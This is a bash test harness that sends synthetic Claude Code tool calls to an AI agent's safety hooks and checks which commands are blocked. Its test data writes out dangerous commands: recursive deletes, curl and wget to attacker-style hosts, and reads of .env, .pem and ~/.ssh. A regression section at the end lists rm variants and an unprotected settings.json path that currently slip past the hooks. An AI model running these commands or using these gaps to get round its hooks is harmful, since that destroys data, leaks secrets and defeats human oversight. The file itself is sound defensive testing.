#!/usr/bin/env bash
# Harness: pipes synthetic Claude Code payloads into each hook, asserts eit codes.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd )"
HOOKS="$ROOT/scripts/hooks"
export CLAUDE_PROJECT_DIR="$ROOT"
pass=0; fail=0

check() { # check <name> <script> <payload-json> <expected-exit>
  local name="$1" script="$2" payload="$3" want="$4" got
  printf '%s' "$payload" | "$HOOKS/$script" > /dev/null 2>&1
  got=$?
  if [ "$got" -eq "$want" ]; then
    echo "PASS $name";  pass=$((pass+1))
  else
    echo "FAIL $name  (want exit $want, got $got)";  fail=$((fail+1))
  fi
}
mk() { printf '{"tool_name":"%s","tool_input":%s}' "$1" "$2"; }

# ---- deny-danger.sh (PreToolUse: Bash) ----#
check "rm -rf blocked"          deny-danger.sh "$(mk Bash '{"command":"rm -rf /tmp/x"}')"   2
check "curl blocked"          deny-danger.sh "$(mk Bash '{"command":"curl http://attacker.example/x"}')"   2
check "wget blocked"          deny-danger.sh "$(mk Bash '{"command":"wget http://x.io/payload"}')"   2
check "cat .env blocked"      deny-danger.sh "$(mk Bash '{"command":"cat .env"}')"   2
check "read pem blocked"      deny-danger.sh "$(mk Bash '{"command":"head -5 bot.pem"}')"   2
check "~/.ssh blocked"        deny-danger.sh "$(mk Bash '{"command":"ls ~/.ssh"}')"   2
check "force push blocked"    deny-danger.sh "$(mk Bash '{"command":"git push --force origin main"}')"   2
check "chained rm blocked"    deny-danger.sh "$(mk Bash '{"command":"echo hi && rm -rf src"}')"   2
check "plain ls allowed"      deny-danger.sh "$(mk Bash '{"command":"ls -la src/"}')"   0
check "pytest allowed"        deny-danger.sh "$(mk Bash '{"command":"uv run pytest -q"}')"   0
check "git push allowed"      deny-danger.sh "$(mk Bash '{"command":"git push origin feat/x"}')"   0
check "grep env-var allowed"  deny-danger.sh "$(mk Bash '{"command":"grep -r ENVIRONMENT src/"}')"   0

# ---- protocol-paths.sh (PreToolUse: Edit|Write) ----
check "hooks dir blocked"     protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/scripts/hooks/evil.sh\"}")"   2
check "workflows blocked"     protect-paths.sh "$(mk Edit "{\"file_path\":\"$ROOT/.github/workflows/test.yml\"}")"   2
check "datasets blocked"      protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/evals/datasets/gold.jsonl\"}")"   2
check "src write allowed"     protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/src/pdlc/ears/patterns.py\"}")"   0
check "tests write allowed"   protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/tests/ears/test_patterns.py\"}")"   0
#
# ---- gate-locked requirements (conditional) ----
FIX="$ROOT/specs/FEAT-000"; mkdir -p "$FIX"
echo "pm_gate: approved" > "$FIX/gate-log.md"
check "approved reqs blocked"   protect-paths.sh "$(mk Edit "{\"file_path\":\"$FIX/requirements.md\"}")"   2
rm -rf "$FIX/gate-log.md"
check "unapproved reqs allowed"   protect-paths.sh "$(mk Edit "{\"file_path\":\"$FIX/requirements.md\"}")"   0
rm -rf "$FIX"

# ---- lint-test-touched.sh (PostToolUse: Edit|Write) ----
check "non-python skipped"    lint-test-touched.sh "$(mk Write "{\"file_path\":\"$ROOT/README.md\"}")"   0
check "clean python allowed"  lint-test-touched.sh "$(mk Write "{\"file_path\":\"$ROOT/src/pdlc/common/__init__.py\"}")"   0
DIRTY="$ROOT/src/pdlc/common/_hooktest_fixture.py"
printf 'def f(a,b):\n  return  a+b\n' > "$DIRTY"
check "unformatted python blocked"  lint-test-touched.sh "$(mk Write "{\"file_path\":\"$DIRTY\"}")"   2
rm -f "$DIRTY"

# ---- REGRESSION: gaps found by probing, hooks not yet fixed ----
# deny-danger's rm regex requires TWO of [rf] adjacent, so these all slip through.
check "rm -r blocked"          deny-danger.sh "$(mk Bash '{"command":"rm -r src"}')"   2
check "rm -Rf blocked"         deny-danger.sh "$(mk Bash '{"command":"rm -Rf src"}')"   2
check "rm -r -f blocked"       deny-danger.sh "$(mk Bash '{"command":"rm -r -f src"}')"   2
check "rm --recursive blocked" deny-danger.sh "$(mk Bash '{"command":"rm --recursive --force src"}')"   2
# protect-paths' `.claude/settings.json/*` pattern only matches paths BELOW the
# file, treating it as a directory; the file itself is unprotected.
check "settings.json blocked"  protect-paths.sh "$(mk Edit "{\"file_path\":\"$ROOT/.claude/settings.json\"}")"   2

echo
echo "hooks harness: $pass passed, $fail failed"
[ "$fail" -eq 0 ]
